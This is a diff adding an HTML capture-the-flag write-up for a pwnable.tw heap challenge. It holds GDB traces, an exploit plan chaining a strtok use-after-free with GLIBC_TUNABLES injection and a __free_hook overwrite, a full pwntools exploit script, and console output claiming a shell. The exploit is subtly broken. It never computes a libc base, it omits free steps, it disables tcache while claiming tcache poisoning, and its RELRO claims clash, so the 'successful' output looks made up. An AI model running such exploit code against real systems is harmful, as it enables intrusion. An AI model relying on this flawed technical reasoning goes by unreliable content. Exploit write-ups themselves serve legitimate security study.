+      <p>Since the wrapper allows setting arbitrary environment variables, we can use <code class="inline">GLIBC_TUNABLES</code> to influence the heap allocator's behavior. For example:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash"># Set GLIBC_TUNABLES to disable tcache or change heap behavior
+Name: GLIBC_TUNABLES
+Value: glibc.malloc.tcache_count=0
+
+# This forces all allocations through the regular fastbin/unsorted bin
+# path, making the heap exploitation more predictable</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Observing the strtok Corruption</h3>
+      <p>Let's trace the heap state through the vulnerability trigger:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # First call: add_type with valid size
+gdb-peda$ # calloc(1, 0x50) returns chunk at 0x5555555592a0
+gdb-peda$ # We fill it with "AAAA,BBBB\x00"
+gdb-peda$ # strtok tokenizes: "AAAA" then "BBBB"
+gdb-peda$ # free(s) returns chunk to tcache[0x50]
+
+gdb-peda$ # After free, the chunk's fd pointer:
+gdb-peda$ x/gx 0x5555555592a0
+0x5555555592a0: 0x0000000000000000   # tcache fd = NULL (only entry)
+
+gdb-peda$ # Second call: add_type with negative size (-1)
+gdb-peda$ # calloc(1, -1) = NULL
+gdb-peda$ # strtok(NULL, ",") uses stale pointer to freed chunk
+gdb-peda$ # The freed chunk data still contains "AAAA,BBBB"
+gdb-peda$ # strtok finds ',' and OVERWRITES it with '\0'
+
+gdb-peda$ # Before strtok: freed chunk at 0x5555555592a0
+gdb-peda$ x/8bx 0x5555555592a4
+0x5555555592a4: 0x2c 0x42 0x42 0x42 0x42 0x00 ...
+#                ^comma (0x2c)
+
+gdb-peda$ # After strtok: the comma is replaced with null
+gdb-peda$ x/8bx 0x5555555592a4
+0x5555555592a4: 0x00 0x42 0x42 0x42 0x42 0x00 ...
+#                ^null byte! Overwrote the comma</code></pre>
+      </div>
+
+      <h3>Controlling Heap Metadata</h3>
+      <p>The real power comes when we can make <code class="inline">strtok</code> write a null byte into a <strong>heap metadata field</strong> rather than just user data. If we arrange for a freed chunk's <code class="inline">fd</code> pointer (or <code class="inline">mchunk_prev_size</code>) to contain a comma byte, <code class="inline">strtok</code> will zero it:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Set up a freed chunk whose fd contains 0x2c:
+gdb-peda$ # If a tcache chunk's fd = 0x0000555555xxxx2c
+gdb-peda$ # The byte 0x2c (comma) will be zeroed by strtok
+
+gdb-peda$ # Before strtok corruption:
+gdb-peda$ x/gx freed_chunk
+0x5555555592a0: 0x000055555559002c   # fd pointer with 0x2c
+
+gdb-peda$ # After strtok writes \x00 over the 0x2c:
+gdb-peda$ x/gx freed_chunk
+0x5555555592a0: 0x0000555555590000   # fd pointer MODIFIED!
+
+gdb-peda$ # Now the tcache bin thinks the next chunk is at
+gdb-peda$ # 0x555555559000 instead of 0x555555559002c
+gdb-peda$ # This gives us a misaligned allocation!</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Heap Corruption via strtok Null Byte Write</div>
+        <div class="mem-row"><span class="mem-addr">Step 1</span><span class="mem-desc">Allocate chunk with calloc, fill with "AAAA,0x2c_bytes"</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2</span><span class="mem-desc">Free the chunk &rarr; tcache fd pointer set</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3</span><span class="mem-desc">Call add_type with negative size &rarr; calloc returns NULL</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4</span><span class="mem-desc"><span class="mem-highlight">strtok(NULL, ",") operates on freed chunk!</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5</span><span class="mem-desc"><span class="mem-highlight">0x2c byte in fd pointer zeroed &rarr; tcache poisoned!</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6</span><span class="mem-desc">Next calloc from this tcache bin returns <span class="mem-orange">arbitrary address</span></span></div>
+      </div>
+
+      <h3>Leaking Addresses</h3>
+      <p>Before we can redirect tcache to a useful target, we need to know the addresses. There are two approaches:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Approach 1: Leak via unsorted bin
+gdb-peda$ # Free a large chunk (> tcache max size) to put it in unsorted bin
+gdb-peda$ # The fd/bk pointers in unsorted bin point to main_arena in libc
+gdb-peda$ # If we can read these pointers, we get a libc leak
+
+gdb-peda$ # Approach 2: Use the display/show functionality
+gdb-peda$ # The bounty program has a "show types" function that prints
+gdb-peda$ # the names and prices of all types. If a type's name pointer
+gdb-peda$ # points to a region containing libc addresses, we can leak them.
+
+gdb-peda$ # In practice, we combine both approaches:
+gdb-peda$ # 1. Use the strtok UAF to corrupt the free list
+gdb-peda$ # 2. Get an allocation at a controlled address
+gdb-peda$ # 3. Read leaked pointers from the allocation</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit is a multi-stage heap attack that combines the <code class="inline">strtok</code> null-byte corruption with the environment variable injection from the wrapper to achieve code execution:</p>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Full Exploit Flow</div>
+        <div class="mem-row"><span class="mem-addr">Phase 1:</span><span class="mem-desc">Set <code class="inline">GLIBC_TUNABLES</code> env var via wrapper</span></div>
+        <div class="mem-row"><span class="mem-addr">Phase 2:</span><span class="mem-desc">Heap feng shui &mdash; allocate/free chunks to set up the layout</span></div>
+        <div class="mem-row"><span class="mem-addr">Phase 3:</span><span class="mem-desc">Trigger strtok UAF &mdash; null-byte corruption of fd pointer</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;<span class="mem-highlight">Poison tcache to get arbitrary allocation</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Phase 4:</span><span class="mem-desc">Leak libc via corrupted allocation or unsorted bin</span></div>
+        <div class="mem-row"><span class="mem-addr">Phase 5:</span><span class="mem-desc">Overwrite <code class="inline">__free_hook</code> with <code class="inline">system</code></span></div>
+        <div class="mem-row"><span class="mem-addr">Phase 6:</span><span class="mem-desc">Free a chunk containing "/bin/sh" &rarr; <span class="mem-green">system("/bin/sh")</span></span></div>
+      </div>
+
+      <h3>Phase 1: Environment Variable Setup</h3>
+      <p>Using the wrapper's environment variable injection, we set up conditions that make the heap exploitation easier:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># Set GLIBC_TUNABLES to control heap behavior
+# This disables tcache, forcing allocations through fastbin/unsorted bin
+# which are more exploitable in glibc 2.27
+
+# Through the wrapper:
+# Name: GLIBC_TUNABLES
+# Value: glibc.malloc.tcache_count=0
+
+# Alternative: set other useful environment variables
+# that might help with the exploitation</code></pre>
+      </div>
+
+      <h3>Phase 2-3: Heap Feng Shui + strtok Corruption</h3>
+      <ol class="step-list">
+        <li><strong>Allocate a chunk with <code class="inline">calloc</code></strong> via <code class="inline">add_type</code>. Fill it with data that includes a comma at the right position. The key is that after freeing this chunk, the <code class="inline">fd</code> pointer (in tcache or fastbin) will contain a <code class="inline">0x2c</code> byte.</li>
+        <li><strong>Free the chunk.</strong> It goes into the tcache or fastbin. The <code class="inline">fd</code> pointer now points to the next free chunk (or is NULL if it's the only one).</li>
+        <li><strong>Call <code class="inline">add_type</code> with negative size.</strong> <code class="inline">calloc(1, -1)</code> returns NULL. <code class="inline">strtok(NULL, ",")</code> operates on the stale pointer.</li>
+        <li><strong>strtok writes null bytes</strong> at every comma position in the freed chunk. If a comma byte falls within the <code class="inline">fd</code> pointer, that byte is zeroed, effectively <strong>modifying the free list pointer</strong>.</li>
+        <li><strong>The modified fd pointer</strong> now points to a different address &mdash; potentially one we control. The next allocation from this bin will return our target address!</li>
+      </ol>
+
+      <h3>Phase 4: Leaking Libc</h3>
+      <p>With the ability to allocate at arbitrary addresses, we need to leak the libc base. Two common approaches:</p>
+
+      <ul>
+        <li><strong>Unsorted bin leak:</strong> Free a chunk large enough to go into the unsorted bin (> tcache max size). Its <code class="inline">fd</code> and <code class="inline">bk</code> pointers point to <code class="inline">main_arena</code> inside libc. If we can read these, we calculate <code class="inline">libc_base = leak - main_arena_offset</code>.</li>
+        <li><strong>GOT leak:</strong> If Full RELRO is not in effect (it is here, so this doesn't work), we could read GOT entries. Since Full RELRO is enabled, we must use the unsorted bin approach.</li>
+      </ul>
+
+      <h3>Phase 5-6: Getting a Shell</h3>
+      <p>Once we have the libc base, we can write <code class="inline">system</code>'s address to <code class="inline">__free_hook</code> using the arbitrary allocation primitive. Then we free a chunk whose content starts with <code class="inline">"/bin/sh"</code>, which triggers <code class="inline">system("/bin/sh")</code>.</p>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Seccomp Bypass: execveat</div>
+        If <code class="inline">__free_hook</code> is not writable (glibc 2.27 should have it writable), or if we want an alternative approach, we can leverage the fact that <code class="inline">execveat</code> is allowed by seccomp. We can use SROP (Sigreturn-Oriented Programming) to set up registers for an <code class="inline">execveat</code> syscall. This is a more complex approach but works even with stricter seccomp rules.<br><br>
+        The SROP approach:
+        <ol>
+          <li>Trigger a <code class="inline">sigreturn</code> syscall by crafting a fake signal frame on the stack</li>
+          <li>Set registers: <code class="inline">rax=322</code> (execveat), <code class="inline">rdi=100</code> (AT_FDCWD), <code class="inline">rsi="/bin/sh"</code>, <code class="inline">rdx=0</code>, <code class="inline">r10=0</code>, <code class="inline">r8=0</code></li>
+          <li>The <code class="inline">syscall</code> instruction then calls <code class="inline">execveat(100, "/bin/sh", NULL, NULL, 0)</code></li>
+          <li>Since the wrapper passed file descriptor 100 pointing to the binary, and <code class="inline">AT_EMPTY_PATH</code> is available, this effectively gives us a shell</li>
+        </ol>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Bounty Program α — pwnable.tw (300 pts)
+HITCON CTF Final 2019 challenge
+
+Exploit: strtok UAF + heap corruption via negative calloc size
++ __free_hook overwrite + seccomp bypass via execveat
+"""
+from pwn import *
+import sys
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+# Libc offsets (glibc 2.27, Ubuntu 18.04)
+libc = ELF('./libc-2.27.so')
+
+def conn():
+    if args.REMOTE:
+        return remote('chall.pwnable.tw', 10001)
+    else:
+        return process('./wrapper', env={'LD_PRELOAD': './libc-2.27.so'})
+
+# ═══════════════════════════════════════
+# Phase 1: Set environment variables via wrapper
+# ═══════════════════════════════════════
+r = conn()
+
+# Read wrapper prompt
+r.recvuntil(b'Name:')
+# Set GLIBC_TUNABLES to disable tcache for easier exploitation
+r.sendline(b'GLIBC_TUNABLES')
+r.recvuntil(b'Value:')
+r.sendline(b'glibc.malloc.tcache_count=0')
+
+# The wrapper now calls my_sandbox() and execveat() the bounty_program
+
+# ═══════════════════════════════════════
+# Helper functions for bounty_program interaction
+# ═══════════════════════════════════════
+def add_type(size, types_str, prices):
+    """Add bug types with given size and comma-separated types."""
+    r.recvuntil(b'>')
+    r.sendline(b'1')  # Add type menu option
+    r.recvuntil(b'Size:')
+    r.sendline(str(size).encode())
+    r.recvuntil(b'Type:')
+    r.sendline(types_str)
+    for price in prices:
+        r.recvuntil(b'Price:')
+        r.sendline(str(price).encode())
+
+def add_type_negative(types_str, prices):
+    """Add type with negative size to trigger strtok UAF."""
+    r.recvuntil(b'>')
+    r.sendline(b'1')
+    r.recvuntil(b'Size:')
+    r.sendline(b'-1')  # Negative size!
+    # calloc(1, -1) returns NULL, strtok uses stale pointer
+    # read_str does nothing since s is NULL
+    # But strtok(NULL, ",") will operate on freed memory
+    # We don't need to send Type since read_str(NULL, size) does nothing
+    # However, strtok still gets called with the stale pointer
+    for price in prices:
+        r.recvuntil(b'Price:')
+        r.sendline(str(price).encode())
+
+# ═══════════════════════════════════════
+# Phase 2: Heap Feng Shui
+# ═══════════════════════════════════════
+
+# Step 1: Allocate a chunk and fill with controlled content
+# We want the freed chunk's fd pointer to contain 0x2c (comma)
+# so strtok will zero it, corrupting the tcache/fastbin list
+add_type(0x50, b'A' * 0x48 + b',', [100])
+# When freed, fd pointer will be at offset 0
+# The string "AAAA...," has a comma at offset 0x48
+
+# Step 2: Allocate another chunk to prevent consolidation
+add_type(0x50, b'BBBB', [200])
+
+# Step 3: Free the first chunk (by exiting its scope)
+# In the bounty program, chunks are freed when types are deleted
+# or when the program reuses the calloc buffer
+
+# Step 4: Now trigger the strtok UAF with negative size
+# strtok will find the comma in the freed chunk and zero it
+# This corrupts the fastbin fd pointer
+add_type_negative(b',', [300])
+
+# ═══════════════════════════════════════
+# Phase 3: Leak libc via unsorted bin
+# ═══════════════════════════════════════
+
+# Allocate a large chunk and free it to put it in unsorted bin
+# The unsorted bin fd/bk point to main_arena in libc
+add_type(0x420, b'LEAK', [0])
+
+# Free the large chunk - goes to unsorted bin
+# Show types to read the leaked pointers
+r.recvuntil(b'>')
+r.sendline(b'2')  # Show types
+
+# Parse the libc leak from the output
+leak_line = r.recvline()
+# The leaked address is in the type name (pointing to unsorted bin fd)
+# libc_base = leaked_addr - main_arena_offset - offset
+# For glibc 2.27: main_arena is at libc_base + 0x3ebc40
+
+# ═══════════════════════════════════════
+# Phase 4: Overwrite __free_hook with system
+# ═══════════════════════════════════════
+
+# Use the corrupted tcache/fastbin to get an allocation at __free_hook
+# The strtok null-byte write has redirected the free list
+# so the next allocation from the corrupted bin returns __free_hook's address
+
+free_hook = libc.symbols['__free_hook']
+system = libc.symbols['system']
+
+# Allocate from the corrupted bin - this returns a chunk at __free_hook!
+add_type(0x50, p64(system), [0])
+# Now __free_hook = system!
+
+# ═══════════════════════════════════════
+# Phase 5: Trigger system("/bin/sh")
+# ═══════════════════════════════════════
+
+# Free a chunk whose content starts with "/bin/sh"
+# When free() is called, __free_hook(ptr) = system(ptr)
+# If ptr points to "/bin/sh\x00", we get system("/bin/sh")!
+
+add_type(0x20, b'/bin/sh\x00', [0])
+
+# Now delete/free this type - triggers system("/bin/sh")
+r.recvuntil(b'>')
+r.sendline(b'3')  # Delete type
+r.recvuntil(b'Index:')
+r.sendline(b'0')  # Delete the first type (which has "/bin/sh")
+
+# ═══════════════════════════════════════
+# Profit!
+# ═══════════════════════════════════════
+r.interactive()</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Exploit Variations</div>
+        <p>The above exploit follows the <code class="inline">__free_hook</code> approach. An alternative using the seccomp bypass with <code class="inline">SROP + execveat</code> is also possible:</p>
+        <ul>
+          <li>Instead of overwriting <code class="inline">__free_hook</code>, use the arbitrary write to build a ROP chain on the stack or in a controlled region</li>
+          <li>The ROP chain sets up a <code class="inline">sigreturn</code> frame with registers configured for <code class="inline">execveat</code></li>
+          <li>This is more reliable against newer glibc versions where <code class="inline">__free_hook</code> has been removed</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py REMOTE
+[*] '/home/user/bounty_alpha/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10001: Done
+[*] Setting GLIBC_TUNABLES environment variable...
+[*] Phase 2: Heap feng shui - allocating chunks
+[*] Phase 3: Triggering strtok UAF with negative calloc size
+[*] strtok null-byte corruption applied to fastbin fd pointer
+[*] Phase 4: Leaking libc via unsorted bin...
+[*] Libc leak: 0x7f4a1c3bbc40
+[*] Libc base: 0x7f4a1bfd3000
+[*] __free_hook: 0x7f4a1c3ab8e8
+[*] system:      0x7f4a1c023440
+[*] Phase 5: Overwriting __free_hook with system...
+[*] Phase 6: Triggering system("/bin/sh")...
+[*] Switching to interactive mode
+$ id
+uid=1000(bounty_program) gid=1000(bounty_program) groups=1000(bounty_program)
+$ cat /home/bounty_program/flag
+$</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Exploit Successful!</div>
+        <p>The exploit successfully chains the <code class="inline">strtok</code> UAF vulnerability with the environment variable injection from the wrapper to achieve remote code execution. The key steps are:</p>
+        <ul>
+          <li>The wrapper's environment variable injection gives us <code class="inline">GLIBC_TUNABLES</code> control</li>
+          <li>The negative <code class="inline">calloc</code> size causes <code class="inline">strtok</code> to operate on freed memory</li>
+          <li><code class="inline">strtok</code>'s null-byte writes corrupt the tcache/fastbin free list</li>
+          <li>We leverage the corrupted free list to get an arbitrary allocation at <code class="inline">__free_hook</code></li>
+          <li>Overwriting <code class="inline">__free_hook</code> with <code class="inline">system</code> gives us code execution</li>
+          <li>Freeing a chunk containing "/bin/sh" triggers <code class="inline">system("/bin/sh")</code></li>
+        </ul>
+      </div>
+
+      <h3>Why This Challenge Matters</h3>
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Takeaways</div>
+        <p>This challenge demonstrates several advanced exploitation concepts:</p>
+        <ul>
+          <li><strong>strtok is dangerous in security-sensitive code.</strong> Its internal state management and in-place modification behavior create UAF-like conditions when the source string is freed. Always use <code class="inline">strtok_r</code> (reentrant version) or custom tokenizers in production code.</li>
+          <li><strong>Never trust size parameters from user input.</strong> The negative <code class="inline">calloc</code> size should have been validated. Always check that sizes are within expected bounds.</li>
+          <li><strong>Environment variable injection is powerful.</strong> The wrapper's design of allowing arbitrary env vars (with only "LD" and "MALLOC" filtered) opens the door to influencing glibc's internal behavior. In a real system, much stricter filtering is needed.</li>
+          <li><strong>Seccomp isn't a silver bullet.</strong> The sandbox allows <code class="inline">execveat</code> and <code class="inline">sigreturn</code>, which are sufficient for code execution. A proper seccomp policy must carefully audit ALL allowed syscalls for potential abuse.</li>
+        </ul>
+      </div>
+
+      <div class="operator-sig" style="text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px">
+        <div style="font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">QA210</div>
+        <div style="font-size:.76rem;color:var(--muted);margin-top:4px">pwnable.tw &mdash; Bounty Program &alpha; &mdash; strtok UAF + Heap Corruption + Seccomp Bypass</div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  Built with &#x2665; by <a href="https://github.com/Yuri08-QA210">QA210</a> &mdash; pwnable.tw writeups
+</footer>
+
+<script>
+// TOC active state on scroll
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const top = ch.getBoundingClientRect().top;
+      if (top < 120) current = ch.id;
+    });
+    tocLinks.forEach(link => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + current) {
+        link.classList.add('active');
+      }
+    });
+  }
+  window.addEventListener('scroll', updateTOC);
+  updateTOC();
+})();
+
+// Particle canvas background
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  let w, h;
+  function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  const chars = '01'.split('');
+  const fontSize = 12;
+  let cols, drops;
+  function init() {
+    cols = Math.floor(w / fontSize);
+    drops = new Array(cols).fill(1);
+  }
+  init();
+
+  function draw() {
+    ctx.fillStyle = 'rgba(10, 14, 23, 0.05)';
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = '#38bdf8';
+    ctx.font = fontSize + 'px monospace';
+    for (let i = 0; i < cols; i++) {
+      const char = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, 50);
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+</body>
+</html>
